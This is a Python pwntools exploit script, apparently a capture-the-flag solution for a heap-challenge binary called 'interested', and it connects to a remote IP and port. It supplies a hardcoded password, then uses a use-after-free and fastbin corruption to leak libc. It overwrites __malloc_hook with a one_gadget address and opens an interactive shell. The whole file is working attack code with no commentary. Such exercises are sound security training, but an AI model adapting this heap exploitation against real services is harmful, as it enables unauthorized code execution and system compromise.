from pwn import *
context.log_level = 'debug'
prog = './interested'
elf = ELF(prog)
#p = process(prog)
#,env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("../libc-2.23.so")
p = remote("123.56.85.29", 3041)

def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def add(size1, content1, size2, content2):
	p.sendlineafter("do :", '1')
	p.sendlineafter("length : ", str(size1))
	p.sendafter(": ", content1)
	p.sendlineafter("length : ", str(size2))
	p.sendafter(": ", content2)
def edit(idx, content1, content2):
	p.sendlineafter("do :", '2')
	p.sendlineafter("ID : ", str(idx))
	p.sendafter(": ", content1)
	p.sendafter(": ", content2)
def show(idx):
	p.sendlineafter("do :", '4')
	p.sendlineafter("ID : ", str(idx))
def free(idx):
	p.sendlineafter("do :", '3')
	p.sendlineafter("ID : ", str(idx))
def exp():
	passwd = 'OreOOrereOOreO'.ljust(0x13, 'a')
	p.sendafter(':', passwd)
	add(0x60, (p64(0)+p64(0x71))*3, 0x60, (p64(0)+p64(0x71))*3)#1
	free(1)
	edit(1, '\x20', '\x20')
	add(0x60, (p64(0)+p64(0x91))*3, 0x60, (p64(0)+p64(0x91))*3)#2
	edit(1, (p64(0)+p64(0x91))*3, (p64(0)+p64(0x31))*4)
	free(2)
	show(2)
	libc.address = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x7f7c98860b78+0x7f7c9849c000
	edit(1, p64(libc.sym['__malloc_hook']-0x23), p64(libc.sym['__malloc_hook']-0x23))
	log.info("libc.address ==> " + hex(libc.address))
	payload = '\x00'*0x13+p64(libc.address+0xf1147)
	add(0x60, payload, 0x60, payload)
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
